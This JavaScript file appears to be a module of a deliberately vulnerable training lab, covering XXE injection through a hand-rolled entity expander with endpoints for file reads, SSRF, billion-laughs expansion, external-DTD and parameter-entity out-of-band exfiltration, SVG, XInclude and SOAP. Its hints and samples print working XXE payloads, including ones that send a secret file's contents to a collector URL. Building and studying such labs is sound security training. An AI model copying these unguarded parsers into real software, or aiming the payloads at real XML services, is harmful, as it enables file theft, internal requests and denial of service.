// XXE Injection module — intentionally vulnerable XML importer.
const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');

const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
const { award } = require('../../lib/flags');

const router = express.Router();

// Fetch a URL with a 5s timeout, used to resolve http:// external entities.
function fetchUrl(url) {
  return new Promise((resolve) => {
    const client = url.startsWith('https://') ? https : http;
    let done = false;
    const finish = (value) => { if (!done) { done = true; resolve(value); } };
    let req;
    try {
      req = client.get(url, { timeout: 5000 }, (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk; });
        res.on('end', () => finish(body));
      });
    } catch (e) {
      return finish(`[entity error: ${e.message}]`);
    }
    req.on('timeout', () => { req.destroy(); finish('[entity error: request timed out after 5s]'); });
    req.on('error', (e) => finish(`[entity error: ${e.message}]`));
  });
}

// Resolve one SYSTEM entity URI to its content.
async function resolveEntity(uri) {
  if (uri.startsWith('file://')) {
    // VULN: arbitrary local file read — SYSTEM file:// entities are honored with no allowlist.
    const filePath = uri.slice('file://'.length);
    try {
      return fs.readFileSync(filePath, 'utf8');
    } catch (e) {
      return `[entity error: could not read file "${filePath}": ${e.message}]`;
    }
  }
  if (uri.startsWith('http://') || uri.startsWith('https://')) {
    // VULN: SSRF via external entity — any http(s) URL is fetched server-side.
    return await fetchUrl(uri);
  }
  return `[entity error: unsupported scheme in "${uri}"]`;
}

// Deliberately naive regex-based entity expander (single pass, no recursion guard needed).
async function expandEntities(xml) {
  // Accept double- or single-quoted SYSTEM URIs (single quotes let parameter-entity
  // payloads nest one entity declaration inside another).
  const re = /<!ENTITY\s+(\w+)\s+SYSTEM\s+(?:"([^"]+)"|'([^']+)')>/g;
  const entities = {};
  let m;
  while ((m = re.exec(xml)) !== null) {
    entities[m[1]] = await resolveEntity(m[2] !== undefined ? m[2] : m[3]);
  }
  let expanded = xml;
  for (const name of Object.keys(entities)) {
    // VULN: entity values are substituted blindly, including attacker-controlled file/URL content.
    expanded = expanded.split('&' + name + ';').join(entities[name]);
  }
  return expanded;
}

// ---- module index ----
router.get('/', (req, res) => {
  const vulnList = module.exports.vulns.map((v) => `
    <div class="vuln">
      <h3><a href="/xxe/${XXE_PAGE_FOR[v.id] || 'import'}">${esc(v.name)}</a> <span class="pill">${esc(v.difficulty)}</span></h3>
      <p>${esc(v.how)}</p>
      ${hintBox(esc(v.hint))}
    </div>`).join('');
  const body = `
    ${brief('XXE Injection', `
      This app imports XML using a <b>hand-rolled, regex-based entity expander</b>.
      It honors <code>&lt;!ENTITY name SYSTEM "file://..."&gt;</code> and
      <code>http://</code> URIs, then substitutes <code>&amp;name;</code>
      references directly into the parsed output. No allowlists, no DTD hardening.
      <br><br>Example payload (use an <b>absolute</b> path; relative paths usually fail):
      <pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM "file:///home/user/workspace/pentrix-vulnlab/modules/xxe/secret.txt"&gt;]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
      For the SSRF flag, point a <code>http://</code> entity at the SSRF module's
      internal secret endpoint (e.g. <code>http://127.0.0.1:PORT/ssrf/internal/secret</code>)
      and look for <code>SSRF-INTERNAL-9921</code> in the output.
    `)}
    <h2>Challenges</h2>
    ${vulnList}`;
  res.send(page('XXE Injection', body));
});

// ---- importer form ----
router.get('/import', (req, res) => {
  const body = `
    <h2>XML Importer</h2>
    <p class="dim">Paste XML below. External entities are expanded server-side.</p>
    <form method="POST" action="/xxe/import">
      <textarea name="xml" rows="12" cols="80" placeholder="&lt;data&gt;hello&lt;/data&gt;"></textarea><br>
      <button type="submit">Import XML</button>
    </form>`;
  res.send(page('XML Importer', body));
});

// ---- importer endpoint ----
router.post('/import', async (req, res) => {
  const xml = req.body.xml || '';
  const expanded = await expandEntities(xml);

  // Show the text content of <data>...</data> if present, else the whole expanded XML.
  const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
  const shown = dataMatch ? dataMatch[1] : expanded;

  let flags = '';
  // VULN: success of the attack is measured on the raw expanded output.
  if (expanded.includes('XXE-SECRET-4471')) {
    flags += flagBox(award(req, 'xxe', 'file'));
  }
  if (expanded.includes('SSRF-INTERNAL-9921')) {
    flags += flagBox(award(req, 'xxe', 'ssrf'));
  }

  const body = `
    <h2>Import result</h2>
    ${flags}
    <h3>Parsed content</h3>
    <pre>${esc(shown)}</pre>
    <p><a href="/xxe/import">&larr; Import more XML</a> · <a href="/xxe">Back to module</a></p>`;
  res.send(page('Import result', body));
});

// ------------------------------------------------- batch 05: deeper XXE labs
const SECRET_ABS = path.join(__dirname, 'secret.txt');

// Challenge page slug per vuln id (used by the index page links).
const XXE_PAGE_FOR = {
  file: 'import', ssrf: 'import',
  'xxe-billion-laughs': 'billion', 'xxe-external-dtd': 'dtd', 'xxe-svg': 'svg',
  'xxe-xinclude': 'xinclude', 'xxe-param-oob': 'param', 'xxe-soap': 'soap',
};

// Recursive internal-entity expander with NO recursion guard: nested entities
// blow up exponentially (billion laughs). Output is capped so the lab box survives.
// VULN: unbounded recursive entity expansion enables an XML DoS.
function expandRecursive(xml) {
  const defs = {};
  const re = /<!ENTITY\s+(\w+)\s+"([^"]*)">/g;
  let m;
  while ((m = re.exec(xml)) !== null) defs[m[1]] = m[2];
  let out = xml;
  for (let i = 0; i < 30; i++) {
    // Stop before the next 10x jump blows past ~80 MB: worst case stays bounded in seconds.
    if (out.length > 8000000) break;
    const next = out.replace(/&(\w+);/g, (mm, name) => (name in defs ? defs[name] : mm));
    if (next === out) break;
    out = next;
  }
  return out;
}

// External-DTD expander: fetches a remote DTD via a parameter entity, expands
// parameter entities declared inside it, then resolves general entities.
// VULN: external DTDs are fetched and their parameter entities honored with no allowlist.
async function expandExternalDtd(xml) {
  let doc = xml;
  const reExt = /<!ENTITY\s+%\s+(\w+)\s+SYSTEM\s+"([^"]+)">/g;
  let m;
  while ((m = reExt.exec(xml)) !== null) {
    const dtdText = await resolveEntity(m[2]);
    const pe = {};
    const rePe = /<!ENTITY\s+%\s+(\w+)\s+SYSTEM\s+"([^"]+)">/g;
    let m2;
    while ((m2 = rePe.exec(dtdText)) !== null) pe[m2[1]] = await resolveEntity(m2[2]);
    let dtdExpanded = dtdText;
    let guard = 0, prev;
    do {
      prev = dtdExpanded;
      dtdExpanded = dtdExpanded.replace(/%(\w+);/g, (mm, n) => (n in pe ? pe[n] : mm));
      guard++;
    } while (dtdExpanded !== prev && guard < 10);
    // Resolving here fires http:// entities declared in the DTD (the OOB pingback).
    dtdExpanded = await expandEntities(dtdExpanded);
    doc = doc.split('%' + m[1] + ';').join(dtdExpanded);
  }
  return expandEntities(doc);
}

// Inline parameter-entity expander: %file; reads a file, %oob; can smuggle a brand
// new <!ENTITY> declaration into the doctype, which is then resolved (OOB).
// VULN: parameter entities are expanded inside the doctype, so an attacker can
// declare new external entities at parse time and exfiltrate out-of-band.
async function expandParamEntities(xml) {
  const extPe = {};
  let m;
  const reExt = /<!ENTITY\s+%\s+(\w+)\s+SYSTEM\s+"([^"]+)">/g;
  while ((m = reExt.exec(xml)) !== null) extPe[m[1]] = await resolveEntity(m[2]);
  const intPe = {};
  const reInt = /<!ENTITY\s+%\s+(\w+)\s+"([^"]*)">/g;
  while ((m = reInt.exec(xml)) !== null) intPe[m[1]] = m[2];
  const allPe = {};
  for (const k of Object.keys(intPe)) {
    allPe[k] = intPe[k].replace(/%(\w+);/g, (mm, n) => (n in extPe ? extPe[n] : mm));
  }
  let doc = xml, prev, guard = 0;
  do {
    prev = doc;
    doc = doc.replace(/%(\w+);/g, (mm, n) => {
      if (n in allPe) return allPe[n];
      if (n in extPe) return extPe[n];
      return mm;
    });
    guard++;
  } while (doc !== prev && guard < 10);
  // Entities declared via %oob; are now plain <!ENTITY> declarations: resolve them.
  return expandEntities(doc);
}

// XInclude expander: xi:include hrefs are resolved server-side like entities.
// VULN: xi:include file:// and http:// hrefs are honored with no allowlist.
async function expandXInclude(xml) {
  const re = /<xi:include\b[^>]*?\bhref="([^"]+)"[^>]*?\/>/gi;
  const jobs = [];
  let m;
  while ((m = re.exec(xml)) !== null) jobs.push({ tag: m[0], href: m[1] });
  let out = xml;
  for (const j of jobs) {
    const content = await resolveEntity(j.href);
    out = out.split(j.tag).join(content);
  }
  return out;
}

// ---- in-lab OOB collector: hosts attacker DTDs and logs exfiltration pingbacks ----
// VULN: the collector accepts attacker DTDs and logs attacker-controlled data with no auth;
// it exists so learners can practice real out-of-band exfiltration inside the lab.
const oobLog = []; // { time, d, ip }
let hostedDtd = '<!ENTITY demo "upload your malicious DTD below">';

router.get('/collector/log', (req, res) => {
  const d = String(req.query.d || '').slice(0, 500);
  oobLog.push({ time: new Date().toISOString(), d, ip: req.ip });
  if (oobLog.length > 100) oobLog.splice(0, oobLog.length - 100);
  res.type('text/plain').send('logged');
});

router.get('/collector/dtd', (req, res) => {
  res.type('text/plain').send(hostedDtd);
});

router.post('/collector/dtd', (req, res) => {
  hostedDtd = String(req.body.dtd || '').slice(0, 5000);
  res.redirect('/xxe/collector');
});

router.get('/collector', (req, res) => {
  const base = `http://${req.get('host')}`;
  const dtdUrl = `${base}/xxe/collector/dtd`;
  const rows = oobLog.slice().reverse().map((e) => `
    <tr><td>${esc(e.time)}</td><td>${esc(e.ip)}</td><td><code>${esc(e.d)}</code></td></tr>`).join('')
    || '<tr><td colspan="3"><i>no pingbacks yet</i></td></tr>';
  const dtdTemplate = `<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY pingback SYSTEM "${base}/xxe/collector/log?d=%file;">`;
  res.send(page('OOB Collector', `
    <h2>Out-of-band collector</h2>
    ${brief('What is this?', `
      <p>Some XXE attacks never show stolen data in the response. Instead the parsed XML
      makes the <b>server</b> send the data somewhere else - this collector is that
      "somewhere else". It does two jobs:</p>
      <ol>
        <li><b>Hosts your malicious DTD</b> at <code>${esc(dtdUrl)}</code> (upload below).</li>
        <li><b>Logs pingbacks</b>: any request to <code>/xxe/collector/log?d=...</code>
        is recorded in the table below, so you can see exfiltrated data arrive.</li>
      </ol>`)}
    <h3>1. Host your DTD</h3>
    <form method="POST" action="/xxe/collector/dtd">
      <textarea name="dtd" rows="6" cols="80" placeholder="paste your DTD here">${esc(hostedDtd)}</textarea><br>
      <button type="submit">Host this DTD</button>
    </form>
    <p class="dim">Currently hosted at <code>${esc(dtdUrl)}</code></p>
    <p>Starter DTD (reads the module secret into <code>%file;</code>, then pings this
    collector back with it in the URL):</p>
    <pre><code>${esc(dtdTemplate)}</code></pre>
    <h3>2. Pingback log</h3>
    <table><tr><th>Time</th><th>From</th><th>d=</th></tr>${rows}</table>
    <p><a href="/xxe">Back to XXE module</a></p>
  `));
});

// ---- v3: billion laughs ----
router.get('/billion', (req, res) => {
  res.send(page('Billion Laughs', `
    <h2>Billion laughs (entity-expansion DoS)</h2>
    ${brief('Challenge', `
      <p>This endpoint expands <b>internal</b> entities (<code>&lt;!ENTITY name "value"&gt;</code>)
      <b>recursively with no depth limit</b>. Define entities that reference each other and
      the parser does exponentially more work on every pass.</p>
      <p>Submit XML up to 3000 characters. The flag is awarded when your payload keeps the
      parser busy for more than <b>1.5 seconds</b>, or blows the expansion past <b>5 MB</b>.
      Your browser URL-encodes the form for you;
      with curl, use <code>--data-urlencode</code> so the <code>&amp;</code> characters survive.</p>`)}
    <form method="POST" action="/xxe/billion">
      <textarea name="xml" rows="12" cols="80" placeholder="&lt;!DOCTYPE lolz [...]&gt;&lt;data&gt;&amp;lol7;&lt;/data&gt;"></textarea><br>
      <button type="submit">Parse XML</button>
    </form>
    ${hintBox('Classic shape: <code>&lt;!ENTITY lol "xxxxxxxxxx"&gt;</code>, then <code>&lt;!ENTITY lol2 "&amp;lol;&amp;lol;... (x10)"&gt;</code>, up to <code>lol7</code>, and reference <code>&amp;lol7;</code> in the body. Each level multiplies the work by ten.')}
  `));
});

router.post('/billion', (req, res) => {
  const xml = String(req.body.xml || '');
  if (xml.length > 3000) {
    return res.status(400).send(page('Billion Laughs', '<p>Payload too large (max 3000 characters).</p><p><a href="/xxe/billion">Back</a></p>'));
  }
  const t0 = Date.now();
  const expanded = expandRecursive(xml);
  const elapsed = Date.now() - t0;
  let flags = '';
  // VULN: award only when a real entity-expansion payload kept the parser busy past the
  // threshold, or blew expansion past 5 MB (a 12 MB expansion from 525 bytes kept the
  // parser busy regardless of machine speed; the size gate de-flakes fast hardware).
  if ((elapsed > 1500 || expanded.length > 5000000) && /<!ENTITY/i.test(xml) && /&\w+;/.test(xml)) {
    flags += flagBox(award(req, 'xxe', 'xxe-billion-laughs'));
  }
  res.send(page('Billion Laughs', `
    <h2>Parse result</h2>
    ${flags}
    <p>Parser busy for <b>${elapsed} ms</b> (time threshold: 1500 ms, size threshold: 5 MB). Input: ${xml.length} chars,
    expanded output: ${expanded.length} chars.</p>
    <h3>Output preview</h3>
    <pre>${esc(expanded.slice(0, 500))}${expanded.length > 500 ? '...' : ''}</pre>
    <p><a href="/xxe/billion">&larr; Try again</a> · <a href="/xxe">Back to module</a></p>
  `));
});

// ---- v4: external DTD ----
router.get('/dtd', (req, res) => {
  const base = `http://${req.get('host')}`;
  const sample = `<!DOCTYPE r [\n<!ENTITY % dtd SYSTEM "${base}/xxe/collector/dtd">\n%dtd;\n]>\n<data>&pingback;</data>`;
  res.send(page('External DTD', `
    <h2>External DTD exfiltration</h2>
    ${brief('Challenge', `
      <p>This endpoint honors an <b>external DTD</b> pulled in through a parameter entity,
      and expands parameter entities declared <b>inside</b> that DTD. Your DTD can read a
      local file into <code>%file;</code> and then make the server request a URL with the
      file content in it.</p>
      <p><b>Plan:</b> 1) host your malicious DTD on the <a href="/xxe/collector">OOB collector</a>,
      2) submit the XML below so the server fetches your DTD, 3) watch the pingback land in
      the collector log with the secret in it.</p>`)}
    <form method="POST" action="/xxe/dtd">
      <textarea name="xml" rows="10" cols="80">${esc(sample)}</textarea><br>
      <button type="submit">Import XML</button>
    </form>
    ${hintBox('Your DTD needs two declarations: <code>&lt;!ENTITY % file SYSTEM "file://' + esc(SECRET_ABS) + '"&gt;</code> and <code>&lt;!ENTITY pingback SYSTEM "' + esc(base) + '/xxe/collector/log?d=%file;"&gt;</code>. The starter template on the collector page has it ready to paste.')}
  `));
});

router.post('/dtd', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  const before = oobLog.length;
  const expanded = await expandExternalDtd(xml);
  const hits = oobLog.slice(before).filter((e) => e.d.includes('XXE-SECRET-4471'));
  let flags = '';
  // VULN: award only when this request made the server exfiltrate the secret to the collector.
  if (hits.length > 0) {
    flags += flagBox(award(req, 'xxe', 'xxe-external-dtd'));
  }
  const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
  const shown = dataMatch ? dataMatch[1] : expanded;
  res.send(page('External DTD', `
    <h2>Import result</h2>
    ${flags}
    <p>Pingbacks to the collector from this request carrying the secret: <b>${hits.length}</b>.
    (<a href="/xxe/collector">view the collector log</a>)</p>
    <h3>Parsed content</h3>
    <pre>${esc(shown.slice(0, 2000))}</pre>
    <p><a href="/xxe/dtd">&larr; Try again</a> · <a href="/xxe">Back to module</a></p>
  `));
});

// ---- v5: XXE in uploaded SVG ----
router.get('/svg', (req, res) => {
  const sample = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">\n<text x="10" y="30">hello</text>\n</svg>`;
  res.send(page('XXE in SVG', `
    <h2>SVG text extractor</h2>
    ${brief('Challenge', `
      <p>Upload an SVG and the app extracts its <code>&lt;text&gt;</code> elements server-side.
      The extractor runs the module's entity-expanding parser first - and an SVG is just XML,
      so it can carry a <code>DOCTYPE</code>.</p>`)}
    <form method="POST" action="/xxe/svg">
      <textarea name="svg" rows="10" cols="80">${esc(sample)}</textarea><br>
      <button type="submit">Extract text</button>
    </form>
    ${hintBox('Give the SVG a DOCTYPE that declares <code>&lt;!ENTITY xxe SYSTEM "file://' + esc(SECRET_ABS) + '"&gt;</code> and put <code>&amp;xxe;</code> inside a <code>&lt;text&gt;</code> element.')}
  `));
});

router.post('/svg', async (req, res) => {
  const svg = String(req.body.svg || '').slice(0, 20000);
  // VULN: the SVG "parser" expands external entities before extracting text.
  const expanded = await expandEntities(svg);
  const texts = [...expanded.matchAll(/<text[^>]*>([\s\S]*?)<\/text>/gi)].map((m) => m[1].trim()).filter(Boolean);
  const shown = texts.length ? texts.join(' | ') : '(no <text> elements found)';
  let flags = '';
  if (expanded.includes('XXE-SECRET-4471')) {
    flags += flagBox(award(req, 'xxe', 'xxe-svg'));
  }
  res.send(page('XXE in SVG', `
    <h2>Extraction result</h2>
    ${flags}
    <h3>Extracted text</h3>
    <pre>${esc(shown.slice(0, 2000))}</pre>
    <p><a href="/xxe/svg">&larr; Extract another</a> · <a href="/xxe">Back to module</a></p>
  `));
});

// ---- v6: XInclude ----
router.get('/xinclude', (req, res) => {
  const sample = `<root xmlns:xi="http://www.w3.org/2001/XInclude">\n  <xi:include href="file://${SECRET_ABS}" parse="text"/>\n</root>`;
  res.send(page('XInclude', `
    <h2>XInclude importer</h2>
    ${brief('Challenge', `
      <p>This endpoint honors <code>&lt;xi:include&gt;</code> tags: the <code>href</code> is
      fetched server-side and spliced into the document. Both <code>file://</code> and
      <code>http://</code> hrefs work.</p>`)}
    <form method="POST" action="/xxe/xinclude">
      <textarea name="xml" rows="8" cols="80">${esc(sample)}</textarea><br>
      <button type="submit">Import XML</button>
    </form>
    ${hintBox('Point an <code>&lt;xi:include href="file://..."&gt;</code> at the module secret file and read the spliced content in the output.')}
  `));
});

router.post('/xinclude', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  // VULN: xi:include hrefs are resolved server-side with no allowlist.
  const out = await expandXInclude(xml);
  let flags = '';
  if (out.includes('XXE-SECRET-4471')) {
    flags += flagBox(award(req, 'xxe', 'xxe-xinclude'));
  }
  res.send(page('XInclude', `
    <h2>Import result</h2>
    ${flags}
    <h3>Expanded document</h3>
    <pre>${esc(out.slice(0, 2000))}</pre>
    <p><a href="/xxe/xinclude">&larr; Try again</a> · <a href="/xxe">Back to module</a></p>
  `));
});

// ---- v7: parameter-entity OOB ----
router.get('/param', (req, res) => {
  const base = `http://${req.get('host')}`;
  const sample = `<!DOCTYPE r [\n<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY % oob "<!ENTITY exfil SYSTEM '${base}/xxe/collector/log?d=%file;'>">\n%oob;\n]>\n<data>&exfil;</data>`;
  res.send(page('Parameter Entity OOB', `
    <h2>Parameter-entity out-of-band exfiltration</h2>
    ${brief('Challenge', `
      <p>No DTD hosting needed this time: everything happens <b>inline</b>. This endpoint expands
      parameter entities inside the doctype, so <code>%oob;</code> can smuggle a brand-new
      <code>&lt;!ENTITY&gt;</code> declaration into the document at parse time. Make that new
      entity point at the <a href="/xxe/collector">OOB collector</a> with the file content in
      the URL, then reference it so the server fires the request.</p>
      <p><b>Quoting trick:</b> the outer parameter entity value is double-quoted, so the smuggled
      inner declaration must use <b>single quotes</b> around its URL.</p>`)}
    <form method="POST" action="/xxe/param">
      <textarea name="xml" rows="10" cols="80">${esc(sample)}</textarea><br>
      <button type="submit">Import XML</button>
    </form>
    ${hintBox('The sample is almost the full exploit: <code>%file;</code> reads the secret, <code>%oob;</code> injects the pingback entity, <code>&amp;exfil;</code> fires it. Submit it and check the collector log.')}
  `));
});

router.post('/param', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  const before = oobLog.length;
  const expanded = await expandParamEntities(xml);
  const hits = oobLog.slice(before).filter((e) => e.d.includes('XXE-SECRET-4471'));
  let flags = '';
  // VULN: award only when this request made the server exfiltrate the secret to the collector.
  if (hits.length > 0) {
    flags += flagBox(award(req, 'xxe', 'xxe-param-oob'));
  }
  const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
  const shown = dataMatch ? dataMatch[1] : expanded;
  res.send(page('Parameter Entity OOB', `
    <h2>Import result</h2>
    ${flags}
    <p>Pingbacks to the collector from this request carrying the secret: <b>${hits.length}</b>.
    (<a href="/xxe/collector">view the collector log</a>)</p>
    <h3>Parsed content</h3>
    <pre>${esc(shown.slice(0, 2000))}</pre>
    <p><a href="/xxe/param">&larr; Try again</a> · <a href="/xxe">Back to module</a></p>
  `));
});

// ---- v8: SOAP endpoint ----
router.get('/soap', (req, res) => {
  const sample = `<?xml version="1.0"?>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n  <soap:Body>\n    <GetStatus>hello</GetStatus>\n  </soap:Body>\n</soap:Envelope>`;
  res.send(page('SOAP XXE', `
    <h2>SOAP status service</h2>
    ${brief('Challenge', `
      <p>A second XML endpoint, this time expecting a SOAP envelope. It runs the same naive
      entity-expanding parser over whatever you send before reading the Body.</p>`)}
    <form method="POST" action="/xxe/soap">
      <textarea name="xml" rows="12" cols="80">${esc(sample)}</textarea><br>
      <button type="submit">Call service</button>
    </form>
    ${hintBox('Add a DOCTYPE with <code>&lt;!ENTITY xxe SYSTEM "file://' + esc(SECRET_ABS) + '"&gt;</code> and reference <code>&amp;xxe;</code> inside <code>&lt;soap:Body&gt;</code>.')}
  `));
});

router.post('/soap', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  // VULN: the SOAP parser expands external entities before reading the Body.
  const expanded = await expandEntities(xml);
  const bodyMatch = expanded.match(/<soap:Body[^>]*>([\s\S]*?)<\/soap:Body>/i);
  const shown = bodyMatch ? bodyMatch[1].trim() : expanded;
  let flags = '';
  if (expanded.includes('XXE-SECRET-4471')) {
    flags += flagBox(award(req, 'xxe', 'xxe-soap'));
  }
  res.send(page('SOAP XXE', `
    <h2>Service response</h2>
    ${flags}
    <h3>Body content</h3>
    <pre>${esc(shown.slice(0, 2000))}</pre>
    <p><a href="/xxe/soap">&larr; Call again</a> · <a href="/xxe">Back to module</a></p>
  `));
});

module.exports = {
  id: 'xxe',
  name: 'XXE Injection',
  tagline: 'Trick a naive XML parser into reading files and hitting internal URLs.',
  description: 'The XML importer expands external entities with a hand-rolled regex parser: file:// URIs are read from disk and http:// URIs are fetched server-side. Use it to read a local secret file, then chain into the SSRF module\'s internal endpoint.',
  difficulty: 'Intermediate',
  vulns: [
    {
      id: 'file',
      name: 'XXE File Read',
      difficulty: 'Medium',
      hint: 'Declare an external entity with a file:// URI pointing at the module\'s secret.txt (absolute path), then reference &name; inside <data>.',
      how: 'Inject an XML external entity (SYSTEM "file://...") and get the server to read a local file into the import result.',
    },
    {
      id: 'ssrf',
      name: 'SSRF via XXE',
      difficulty: 'Hard',
      hint: 'The same expander also fetches http:// URLs. Point an entity at the SSRF module\'s internal secret endpoint and chain it: XXE → SSRF → internal secret.',
      how: 'Use an XML external entity with an http:// SYSTEM URI to make the server request an internal endpoint and leak its response.',
    },
    {
      id: 'xxe-billion-laughs',
      name: 'Billion Laughs (Entity-Expansion DoS)',
      difficulty: 'Medium',
      hint: 'The billion endpoint expands internal entities recursively with no depth limit. Define entities that reference each other and watch the parse time.',
      how: 'Submit nested <!ENTITY> definitions (lol, lol2 ... lol7) so expansion explodes exponentially and parse time exceeds 1.5s.',
    },
    {
      id: 'xxe-external-dtd',
      name: 'External DTD Exfiltration',
      difficulty: 'Medium',
      hint: 'Host a malicious DTD on the in-lab OOB collector, pull it in with a parameter entity, and make the DTD ping the collector back with the file content in the URL.',
      how: 'Upload a DTD that reads secret.txt into %file; and declares a pingback entity to /xxe/collector/log?d=%file;, then import XML that fetches your DTD.',
    },
    {
      id: 'xxe-svg',
      name: 'XXE in Uploaded SVG',
      difficulty: 'Medium',
      hint: 'The SVG text extractor runs the same entity-expanding parser. An SVG is just XML, and XML can carry a DOCTYPE.',
      how: 'Upload an SVG whose DOCTYPE declares a file:// entity for secret.txt and references it inside a <text> element.',
    },
    {
      id: 'xxe-xinclude',
      name: 'XInclude File Inclusion',
      difficulty: 'Medium',
      hint: 'The xinclude endpoint honors xi:include tags. The href is resolved server-side with the same file:// and http:// support as entities.',
      how: 'Submit XML with <xi:include href="file:///.../secret.txt" parse="text"/> and read the spliced content in the output.',
    },
    {
      id: 'xxe-param-oob',
      name: 'Parameter-Entity OOB Exfiltration',
      difficulty: 'Hard',
      hint: 'Chain parameter entities entirely inline: %file; reads the secret, %oob; declares a new entity whose URL carries %file; to the in-lab collector. Mind the quoting.',
      how: 'Submit a DOCTYPE where %oob; injects <!ENTITY exfil SYSTEM \'http://.../xxe/collector/log?d=%file;\'> (single quotes!), then reference &exfil; to fire the pingback.',
    },
    {
      id: 'xxe-soap',
      name: 'XXE in SOAP Endpoint',
      difficulty: 'Easy',
      hint: 'A second XML endpoint with the same naive parser, this time expecting a SOAP envelope. The DOCTYPE rides along the same way.',
      how: 'Send a SOAP envelope whose DOCTYPE declares a file:// entity for secret.txt and references it inside <soap:Body>.',
    },
  ],
  router,
};
